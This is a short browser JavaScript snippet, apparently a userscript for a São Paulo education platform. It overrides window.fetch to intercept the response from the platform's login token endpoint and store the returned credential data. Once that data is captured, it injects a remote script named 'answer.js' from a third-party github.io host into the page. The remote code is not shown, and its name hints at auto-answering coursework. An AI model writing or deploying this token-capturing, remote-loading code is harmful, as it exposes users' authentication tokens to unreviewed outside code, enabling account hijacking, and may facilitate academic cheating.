let _dadosLogin = null;

Object.defineProperty(window, 'dadosLogin', {
  get() {
    return _dadosLogin;
  },
  set(value) {
    _dadosLogin = value;
    if (value) {
      const script = document.createElement('script');
      script.src = 'https://inacallep.github.io/fandangos/scripts/answer.js';
      document.head.appendChild(script);
    }
  }
});

const originalFetch = window.fetch;

window.fetch = async function(url, options) {
  if (url === 'https://edusp-api.ip.tv/registration/edusp/token') {
    return originalFetch(url, options)
      .then(response => {
        response.clone().json().then(data => {
          dadosLogin = data;
        });
        return response;
      })
      .catch(error => {
        throw error;
      });
  }
  return originalFetch(url, options);
};
